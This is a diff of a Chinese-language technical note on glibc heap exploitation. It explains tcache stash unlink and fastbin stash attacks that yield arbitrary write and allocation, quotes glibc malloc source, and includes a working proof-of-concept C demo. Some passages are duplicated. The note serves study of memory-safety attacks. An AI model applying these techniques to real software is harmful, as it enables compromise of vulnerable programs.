@@ -473,11 +473,75 @@ bck->fd = unsorted_chunks (av);
 
 但有另外的地方可利用，`unsortedbin_attack`无非就是往一个地址写一个值，如果只是为了改例如`global_max_fast`,那`largebin_attack`完全可以替代，只不过写入的是堆地址.
 
-如果要达到写libc地址，也可以，有师傅把它叫做**tcache stash unlink attack plus**，利用过程大致就是将`smallbin_chunk`的bk指针改成`target-2*size_t`（target为攻击的地址）,**前提条件**是`target->bk`也就是`target+3*size_t`为一个可写地址。
-
-原理是当从small bin中申请出chunk时，会将small bin剩余的chunk放入到tcache中，但并没有对其进行完整性检测，而且在unlink过程中会任意地址`target`写入一个`main_arena`的地址(当然这个洞在引入tcache时的glibc版本就已经存在)。
+如果要达到写libc地址，也可以，有师傅把它叫做**tcache stash unlink attack plus**，
 
 ```c
+  if (in_smallbin_range (nb))
+    {
+      idx = smallbin_index (nb);
+      bin = bin_at (av, idx);
+
+      if ((victim = last (bin)) != bin)
+        {
+          bck = victim->bk;
+	  if (__glibc_unlikely (bck->fd != victim))
+	    malloc_printerr ("malloc(): smallbin double linked list corrupted");
+          set_inuse_bit_at_offset (victim, nb);
+          bin->bk = bck;  
+          bck->fd = bin;
+
+          if (av != &main_arena)
+	    set_non_main_arena (victim);
+          check_malloced_chunk (av, victim, nb);
+#if USE_TCACHE
+	  /* While we're here, if we see other chunks of the same size,
+	     stash them in the tcache.  */
+	  size_t tc_idx = csize2tidx (nb);
+	  if (tcache && tc_idx < mp_.tcache_bins)
+	    {
+	      mchunkptr tc_victim;
+
+	      /* While bin not empty and tcache not full, copy chunks over.  */
+	      while (tcache->counts[tc_idx] < mp_.tcache_count
+		     && (tc_victim = last (bin)) != bin)
+		{
+		  if (tc_victim != 0)
+		    {
+		      bck = tc_victim->bk;
+		      set_inuse_bit_at_offset (tc_victim, nb);
+		      if (av != &main_arena)
+			set_non_main_arena (tc_victim);
+		      bin->bk = bck;
+		      bck->fd = bin;
+
+		      tcache_put (tc_victim, tc_idx);
+	            }
+		}
+	    }
+#endif
+          void *p = chunk2mem (victim);
+          alloc_perturb (p, bytes);
+          return p;
+        }
+    }
+
+```
+
+
+前置条件是：对应tcache中预留2个chunk位（至少）(除非你能伪造fd，绕过双向链表检测)
+
+small bin中存在2个chunk，我们修改small bin头部chunk的bk为`target`，fd不变（ 不修改small bin尾部chunk是为了绕过分配时的`smallbin double linked list corrupted`检测 ）,且`target->bk`( `target+3*size_t` )必须是一个可写地址，记作`target->bk = attack_addr`
+
+
+原理是`_int_malloc`中,当从small bin中申请出chunk时，small bin尾部chunk在经过双向链表检测后会被分配出去，启用tcache会遍历small bin中剩余的chunk放入到对应tcache中，但此时的small bin链表已经被破坏，` (tc_victim = last (bin)) != bin` 这个条件恒成立直到abort，为了beak那个while循环，我们才在tcache中预留2个chunk位，直到tcache被填满`tcache->counts[tc_idx] = mp_.tcache_count`以此来跳出循环。
+
+同时在最后一次unlink过程中会往`attack_addr -> fd `写入一个`main_arena`的地址，**实现任意地址写**。(当然这个洞在引入tcache时的glibc版本就已经存在)。
+
+```c
+static void *
+_int_malloc (mstate av, size_t bytes)
+
+
 /* While bin not empty and tcache not full, copy chunks over.  */
 while (tcache->counts[tc_idx] < mp_.tcache_count
   && (tc_victim = last (bin)) != bin)
@@ -496,13 +560,205 @@ while (tcache->counts[tc_idx] < mp_.tcache_count
 
 ```
 
-接上面，值得注意的是，由于smallbin摘链后chunk全部进入tcache，所以tcache对应idx入口处的chunk是`target_chunk`。如果再次调用malloc申请chunk，得益于从tcache分配时未仔细检查`chunk_head`，这时便会从tcache中将这个`target_chunk`分配出来，实现任意地址分配内存。
+
+这时tcache已满，且tcache顶部刚好是我们伪造那个`target_chunk`
+
 
 
 4.在使用top chunk的时候增加了检查：size要小于等于system_mems，因为House of Force需要控制top chunk的size为-1，不能通过这项检查，所以House of Force不可用
 
+## tcache相关冷门漏洞(任意地址写与任意地址分配)
 
 
+1.small bin
+```c
+  if (in_smallbin_range (nb))
+    {
+      idx = smallbin_index (nb);
+      bin = bin_at (av, idx);
+
+      if ((victim = last (bin)) != bin)
+        {
+          bck = victim->bk;
+	  if (__glibc_unlikely (bck->fd != victim))
+	    malloc_printerr ("malloc(): smallbin double linked list corrupted");
+          set_inuse_bit_at_offset (victim, nb);
+          bin->bk = bck;  
+          bck->fd = bin;
+
+          if (av != &main_arena)
+	    set_non_main_arena (victim);
+          check_malloced_chunk (av, victim, nb);
+#if USE_TCACHE
+	  /* While we're here, if we see other chunks of the same size,
+	     stash them in the tcache.  */
+	  size_t tc_idx = csize2tidx (nb);
+	  if (tcache && tc_idx < mp_.tcache_bins)
+	    {
+	      mchunkptr tc_victim;
+
+	      /* While bin not empty and tcache not full, copy chunks over.  */
+	      while (tcache->counts[tc_idx] < mp_.tcache_count
+		     && (tc_victim = last (bin)) != bin)
+		{
+		  if (tc_victim != 0)
+		    {
+		      bck = tc_victim->bk;
+		      set_inuse_bit_at_offset (tc_victim, nb);
+		      if (av != &main_arena)
+			set_non_main_arena (tc_victim);
+		      bin->bk = bck;
+		      bck->fd = bin;
+
+		      tcache_put (tc_victim, tc_idx);
+	            }
+		}
+	    }
+#endif
+          void *p = chunk2mem (victim);
+          alloc_perturb (p, bytes);
+          return p;
+        }
+    }
+
+```
+
+
+前置条件是：对应tcache中预留2个chunk位（至少）(除非你能伪造fd，绕过双向链表检测)
+
+small bin中存在2个chunk，我们修改small bin头部chunk的bk为`target`，fd不变（ 不修改small bin尾部chunk是为了绕过分配时的`smallbin double linked list corrupted`检测 ）,且`target->bk`( `target+3*size_t` )必须是一个可写地址，记作`target->bk = attack_addr`
+
+
+原理是`_int_malloc`中,当从small bin中申请出chunk时，small bin尾部chunk在经过双向链表检测后会被分配出去，启用tcache会遍历small bin中剩余的chunk放入到对应tcache中，但此时的small bin链表已经被破坏，` (tc_victim = last (bin)) != bin` 这个条件恒成立直到abort，为了beak那个while循环，我们才在tcache中预留2个chunk位，直到tcache被填满`tcache->counts[tc_idx] = mp_.tcache_count`以此来跳出循环。
+
+同时在最后一次unlink过程中会往`attack_addr -> fd `写入一个`main_arena`的地址，实现任意地址写。
+
+
+```c
+static void *
+_int_malloc (mstate av, size_t bytes)
+
+
+/* While bin not empty and tcache not full, copy chunks over.  */
+while (tcache->counts[tc_idx] < mp_.tcache_count
+  && (tc_victim = last (bin)) != bin)
+{
+	if (tc_victim != 0)
+	    {
+	      bck = tc_victim->bk;
+	      set_inuse_bit_at_offset (tc_victim, nb);
+	      if (av != &main_arena)
+		set_non_main_arena (tc_victim);
+	      bin->bk = bck;
+	      bck->fd = bin;
+	      tcache_put (tc_victim, tc_idx);
+        }
+}
+
+```
+
+
+这时tcache已满，且tcache顶部刚好是我们伪造那个`target_chunk`
+
+
+由于smallbin摘链后chunk全部进入tcache，且已满，这时tcache对应idx入口处的chunk是`target_chunk`。如果再次调用malloc申请chunk，得益于从tcache分配时未仔细检查`chunk_head`，这时便会从tcache中将这个`target_chunk`分配出来，实现任意地址分配内存。
+
+
+demo代码可参考V1me师傅写的
+```c
+#include<stdio.h>
+#include<stdlib.h>
+int main() {
+    char buf[0x100];
+    long *ptr1 = NULL, *ptr2 = NULL;
+    int i = 0;
+
+    memset(buf, 0, sizeof(buf));
+    *(long *)(buf + 8) = (long)buf + 0x40;
+
+    // put 5 chunks in tcache[0x90]
+    for (i = 0; i < 5; i++) {
+        free(calloc(1, 0x88));
+    }
+
+    // put 2 chunks in small bins
+    ptr1 = calloc(1, 0x168);
+    calloc(1, 0x18);
+    ptr2 = calloc(1, 0x168);
+
+    for (i = 0; i < 7; i++) {
+        free(calloc(1, 0x168));
+    }
+
+    free(ptr1);
+    ptr1 = calloc(1, 0x168 - 0x90);
+
+    free(ptr2);
+    ptr2 = calloc(1, 0x168 - 0x90);
+
+    calloc(1, 0x108);
+
+    // ptr1 and ptr2 point to the small bin chunks [0x90]
+    ptr1 += (0x170 - 0x90) / 8;
+    ptr2 += (0x170 - 0x90) / 8;
+
+    // vuln
+    ptr2[1] = (long)buf - 0x10;
+
+    // trigger
+    calloc(1, 0x88);
+
+    // malloc from tcache
+    ptr1 = malloc(0x88);
+    strcpy((char *)ptr1, "Ohhhhhh! you are pwned!");
+    printf("%s\n", buf);
+    return 0;
+}
+
+
+```
+
+2.fast bin
+
+当从fastbin中分配出chunk时(比如调用calloc->_int_malloc)，如果fastbin中还有剩余chunk且相对应idx的tcache有空闲位置，这时就会根据fd指针将剩余的fastbin_chunk链入tcache中，且在这个过程中并没有检查剩余`fastbin_chunk`的完整性。
+
+
+```c
+static void *
+_int_malloc (mstate av, size_t bytes)
+
+#if USE_TCACHE
+	      /* While we're here, if we see other chunks of the same size,
+		 stash them in the tcache.  */
+	      size_t tc_idx = csize2tidx (nb);
+	      if (tcache && tc_idx < mp_.tcache_bins)
+		{
+		  mchunkptr tc_victim;
+
+		  /* While bin not empty and tcache not full, copy chunks.  */
+		  while (tcache->counts[tc_idx] < mp_.tcache_count
+			 && (tc_victim = *fb) != NULL)
+		    {
+		      if (SINGLE_THREAD_P)
+			*fb = tc_victim->fd;
+		      else
+			{
+			  REMOVE_FB (fb, pp, tc_victim);
+			  if (__glibc_unlikely (tc_victim == NULL))
+			    break;
+			}
+		      tcache_put (tc_victim, tc_idx);
+		    }
+		}
+#endif
+
+
+
+```
+
+如果我们通过UAF能修改fastbin链表尾部chunk的fd指针为一个`target_addr`，当这个`target_chunk`最后被滑入tcache中时，`target_chunk`做为tcache的头部，若tcache中存在其他chunk，则`target_chunk -> fd` 就被写入一个堆地址，实现任意地址写。
+
+与此同时，如果再次调用malloc申请chunk，得益于从tcache分配时未仔细检查`chunk_head`，这时便会从tcache中将这个`target_chunk`分配出来，实现任意地址分配内存。（任意地址分配内存在这种情况下是个鸡肋。。。。。。。）
 
 
 ## House-of-Corrosion 任意地址写
